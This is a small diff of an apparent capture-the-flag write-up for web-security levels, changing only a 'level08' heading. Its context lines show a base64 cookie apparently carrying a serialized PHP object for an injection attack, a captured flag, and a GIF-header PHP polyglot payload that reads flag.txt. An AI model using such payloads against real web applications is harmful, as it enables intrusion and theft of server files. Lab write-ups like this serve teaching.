@@ -39,7 +39,7 @@ Then we base64 encode it and set it as the cookie: `TzozOiJTUUwiOjE6e3M6NToicXVl
 After refreshing the page, we get the flag: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
 
 
-## level08
+### level08
 
 ```php
 GIF89a1 <?php echo file_get_contents("flag.txt"); ?>
